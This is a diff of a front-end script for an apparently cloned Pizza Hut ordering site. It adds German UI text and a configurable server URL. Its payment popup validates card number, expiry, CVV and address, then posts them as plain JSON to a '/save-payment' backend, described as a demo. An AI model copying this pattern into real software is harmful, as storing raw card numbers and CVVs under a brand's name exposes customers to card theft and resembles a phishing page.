@@ -1,75 +1,70 @@
+// const serverUrl = 'https://pizzahut-back.onrender.com';
+const serverUrl = 'http://localhost:3000';
+
+/*~~~~~~~~~~~~~~~ MENU CONTROL ~~~~~~~~~~~~~~~*/
 const navMenu = document.getElementById("nav-menu");
 const navToggle = document.getElementById("nav-toggle");
 const navClose = document.getElementById("nav-close");
+const navLink = document.querySelectorAll(".nav__link");
 
-const navLink = document.querySelectorAll(".nav__link")
-/*~~~~~~~~~~~~~~~ TOGGLE MENU ~~~~~~~~~~~~~~~*/
-/* MENU SHOW */
 if (navToggle) {
     navToggle.addEventListener('click', () => {
         navMenu.classList.add('show-menu')
-    })
+    });
 }
 
-/* MENU HIDDEN */
 if (navClose) {
     navClose.addEventListener('click', () => {
         navMenu.classList.remove("show-menu")
-    })
+    });
 }
 
-/* REMOVE MENU MOBILE */
 navLink.forEach(link => link.addEventListener('click', () => {
     navMenu.classList.remove("show-menu")
-}))
-/*~~~~~~~~~~~~~~~ CHANGE BACKGROUND HEADER ~~~~~~~~~~~~~~~*/
+}));
 
+/*~~~~~~~~~~~~~~~ CHANGE HEADER ON SCROLL ~~~~~~~~~~~~~~~*/
 const scrollHeader = () => {
     const header = document.getElementById("header");
-
     this.scrollY >= 50
         ? header.classList.add("bg-header")
         : header.classList.remove("bg-header");
-}
+};
 window.addEventListener("scroll", scrollHeader);
 
-/*~~~~~~~~~~~~~~~ SCROLL SECTIONS ACTIVE LINK ~~~~~~~~~~~~~~~*/
+/*~~~~~~~~~~~~~~~ ACTIVE NAV LINK ~~~~~~~~~~~~~~~*/
 const activeLink = () => {
-    const section = document.querySelectorAll('section');
-    const navLink = document.querySelectorAll(".nav__link");
-
+    const sections = document.querySelectorAll('section');
+    const navLinks = document.querySelectorAll(".nav__link");
     let current = "home";
 
-    section.forEach(section => {
+    sections.forEach(section => {
         const sectionTop = section.offsetTop;
-
         if (this.scrollY >= sectionTop - 60) {
             current = section.getAttribute('id');
         }
-    })
+    });
 
-    navLink.forEach(item => {
+    navLinks.forEach(item => {
         item.classList.remove('active-link');
         if (item.href.includes(current)) {
             item.classList.add("active-link")
         }
-    })
-
-}
-
+    });
+};
 window.addEventListener("scroll", activeLink);
 
-/*~~~~~~~~~~~~~~~ SHOW SCROLL UP ~~~~~~~~~~~~~~~*/
+/*~~~~~~~~~~~~~~~ SCROLL UP BUTTON ~~~~~~~~~~~~~~~*/
 const scrollUp = () => {
     const scrollUp = document.getElementById("scroll-up");
-
     this.scrollY >= 350
         ? scrollUp.classList.add("show-scroll")
         : scrollUp.classList.remove("show-scroll");
-}
+};
 window.addEventListener("scroll", scrollUp);
-/*~~~~~~~~~~~~~~~ DARK LIGHT THEME ~~~~~~~~~~~~~~~*/
-const themebutton = document.getElementById('theme-button');
+
+/*~~~~~~~~~~~~~~~ DARK/LIGHT THEME ~~~~~~~~~~~~~~~*/
+const themeButton = document.getElementById('theme-button');
 
 if (localStorage.getItem('mode') == 'dark') {
     darkmode();
@@ -77,28 +72,26 @@ if (localStorage.getItem('mode') == 'dark') {
     lightmode();
 }
 
-themebutton.addEventListener('click', (e) => {
+themeButton.addEventListener('click', () => {
     if (localStorage.getItem('mode') == 'light') {
         darkmode();
-    }
-    else {
+    } else {
         lightmode();
     }
-
-})
+});
 
 function darkmode() {
     document.body.classList.add('dark-theme');
-    themebutton.classList.replace('fa-moon', 'fa-sun');
+    themeButton.classList.replace('fa-moon', 'fa-sun');
     localStorage.setItem('mode', 'dark');
 }
 
 function lightmode() {
     document.body.classList.remove('dark-theme');
-    themebutton.classList.replace('fa-sun', 'fa-moon');
+    themeButton.classList.replace('fa-sun', 'fa-moon');
     localStorage.setItem('mode', 'light');
-
 }
+
 /*~~~~~~~~~~~~~~~ SCROLL REVEAL ANIMATION ~~~~~~~~~~~~~~~*/
 const sr = ScrollReveal({
     origin: 'top',
@@ -109,30 +102,24 @@ const sr = ScrollReveal({
 
 sr.reveal('.home__img');
 sr.reveal(".home__data", { origin: 'bottom' });
-
 sr.reveal(".about__data", { origin: "left" });
 sr.reveal(".about__img", { origin: "right" });
-
 sr.reveal(".popular__card", { interval: 100 });
-
-
 sr.reveal('.recently__data', { origin: "left" });
 sr.reveal(".recently__img", { origin: 'right' });
-
 sr.reveal('.newsletter');
-
 sr.reveal('.footer');
 
 /*~~~~~~~~~~~~~~~ PAYMENT POPUP ~~~~~~~~~~~~~~~*/
 const popup = document.getElementById('payment-popup');
 const closeBtn = document.querySelector('.close-btn');
 const paymentForm = document.getElementById('payment-form');
-const addressInput = paymentForm.querySelector('input[placeholder="Delivery Address"]');
-const nameInput = paymentForm.querySelector('input[placeholder="Cardholder Name"]');
-const cardInput = paymentForm.querySelector('input[placeholder="Card Number"]');
-const expiryInput = paymentForm.querySelector('input[placeholder="Expiry Date (MM/YY)"]');
-const cvvInput = paymentForm.querySelector('input[placeholder="CVV"]');
 
+const addressInput = paymentForm.querySelector('input[placeholder="Lieferadresse (mit PLZ & Stadt)"]');
+const nameInput = paymentForm.querySelector('input[placeholder="Name auf der Karte"]');
+const cardInput = paymentForm.querySelector('input[placeholder="Kartennummer"]');
+const expiryInput = paymentForm.querySelector('input[placeholder="Ablaufdatum (MM/YY)"]');
+const cvvInput = paymentForm.querySelector('input[placeholder="CVC"]');
 
 document.querySelectorAll('.order-now-btn').forEach(button => {
     button.addEventListener('click', (e) => {
@@ -159,15 +146,13 @@ window.addEventListener('click', (e) => {
 });
 
 addressInput.addEventListener('input', () => {
-    let value = addressInput.value.trim();
-    if (value.length >= 5) {
+    if (addressInput.value.trim().length >= 5) {
         clearError(addressInput);
     }
 });
 
 nameInput.addEventListener('input', () => {
-    let value = nameInput.value.trim();
-    if (/^[A-Za-z\s]{2,}$/.test(value)) {
+    if (/^[A-Za-z\s]{2,}$/.test(nameInput.value.trim())) {
         clearError(nameInput);
     }
 });
@@ -206,64 +191,74 @@ paymentForm.addEventListener('submit', (e) => {
 
     let hasError = false;
 
-    if (addressInput.value.trim() === '') {
-        showError(addressInput, 'Please enter a delivery address.');
-        hasError = true;
-    }
-
+    const address = addressInput.value.trim();
+    const cardholderName = nameInput.value.trim();
     const cardNumber = cardInput.value.replace(/\s+/g, '');
-    if (!/^\d{16}$/.test(cardNumber)) {
-        showError(cardInput, 'Enter a 16-digit card number.');
+    const expiry = expiryInput.value.trim();
+    const cvv = cvvInput.value.trim();
+
+    if (address === '') {
+        showError(addressInput, 'Bitte geben Sie eine Lieferadresse ein.');
         hasError = true;
     }
 
-    if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(expiryInput.value.trim())) {
-        showError(expiryInput, 'Use MM/YY format.');
+    if (!/^[A-Za-z\s]{2,}$/.test(cardholderName)) {
+        showError(nameInput, 'Bitte geben Sie den Namen des Karteninhabers ein.');
+        hasError = true;
+    }
+
+    if (!/^\d{16}$/.test(cardNumber)) {
+        showError(cardInput, 'Geben Sie eine 16-stellige Kartennummer ein.');
+        hasError = true;
+    }
+
+    if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(expiry)) {
+        showError(expiryInput, 'Verwenden Sie das Format MM/YY.');
         hasError = true;
     } else {
-        const [month, year] = expiryInput.value.split('/').map(Number);
+        const [month, year] = expiry.split('/').map(Number);
         const now = new Date();
         const currentYear = now.getFullYear() % 100;
         const currentMonth = now.getMonth() + 1;
         if (year < currentYear || (year === currentYear && month < currentMonth)) {
-            showError(expiryInput, 'Card has expired.');
+            showError(expiryInput, 'Die Karte ist abgelaufen.');
             hasError = true;
         }
     }
 
-    if (!/^\d{3,4}$/.test(cvvInput.value.trim())) {
-        showError(cvvInput, 'Enter a 3- or 4-digit CVV.');
+    if (!/^\d{3,4}$/.test(cvv)) {
+        showError(cvvInput, 'Geben Sie eine 3- oder 4-stellige CVC ein.');
         hasError = true;
     }
 
     if (!hasError) {
         const payload = {
-            address: addressInput.value.trim(),
-            cardholderName: nameInput.value.trim(),
-            cardNumber: cardInput.value.trim(),
-            expiry: expiryInput.value.trim(),
-            cvv: cvvInput.value.trim()
+            address,
+            cardholderName,
+            cardNumber,
+            expiry,
+            cvv
         };
 
-        fetch('https://pizzahut-back.onrender.com/save-payment', {
+        fetch(`${serverUrl}/save-payment`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(payload)
         })
-            .then(res => res.text())
-            .then(msg => {
-                console.log(msg);
-                showSuccessMessage('Payment saved locally (for demo)');
+            .then(res => res.json())
+            .then(data => {
+                console.log('Server response:', data);
+                showSuccessMessage('Zahlung erfolgreich gespeichert (Demo)');
                 paymentForm.reset();
                 closePopupSmoothly();
             })
             .catch(err => {
-                console.error(err);
-                alert('Error saving data');
+                console.error('Error:', err);
+                alert('Fehler beim Speichern der Daten');
             });
     }
-
 });
+
 
 function showError(input, message) {
     let error = input.nextElementSibling;
